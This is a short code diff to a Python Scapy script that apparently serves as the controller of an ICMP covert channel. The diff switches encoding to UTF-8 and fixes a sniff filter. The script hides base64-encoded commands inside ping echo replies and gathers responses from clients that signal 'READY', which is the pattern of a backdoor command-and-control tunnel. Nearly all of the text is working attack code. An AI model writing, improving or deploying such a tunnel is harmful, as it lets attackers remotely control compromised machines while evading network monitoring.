@@ -12,18 +12,18 @@ msg=""
 stop=0
 
 def parse_end(packet):
-	if ('END' == b64decode(packet[Raw].load).decode('ascii').split()[-1]):
+	if ('END' == b64decode(packet[Raw].load).decode('utf-8').split()[-1]):
 		return True
 
 	return False
 	
 def concat_msg(packet):
 	global msg
-	msg += b64decode(packet[Raw].load).decode('ascii')
+	msg += b64decode(packet[Raw].load).decode('utf-8')
 	
 def send_cmd(packet, command):
 	try:
-		ping_rep=IP(dst=packet[0][IP].src, id=packet[0][IP].id)/ICMP(type="echo-reply",id=packet[0][ICMP].id,seq=packet[0][ICMP].seq)/(b64encode(command.encode('ascii')))
+		ping_rep=IP(dst=packet[0][IP].src, id=packet[0][IP].id)/ICMP(type="echo-reply",id=packet[0][ICMP].id,seq=packet[0][ICMP].seq)/(b64encode(command.encode('utf-8')))
 		send(ping_rep, verbose=False)
 	except Exception as e:
 		print("in send_cmd: "+e)
@@ -57,7 +57,7 @@ def recieve_msg():
 			global msg
 			prailer = "START "
 			msg = ""
-			rp = sniff(filter="icmp and icmp[0]=8)",prn=concat_msg, stop_filter=parse_end, timeout=100)
+			rp = sniff(filter="icmp and icmp[0]=8",prn=concat_msg, stop_filter=parse_end, timeout=100)
 			msg_lst = msg.split()
 			if('READY' == msg_lst[0] and avail_cmd.acquire(blocking=False)):
 				send_cmd(rp, prailer+command)
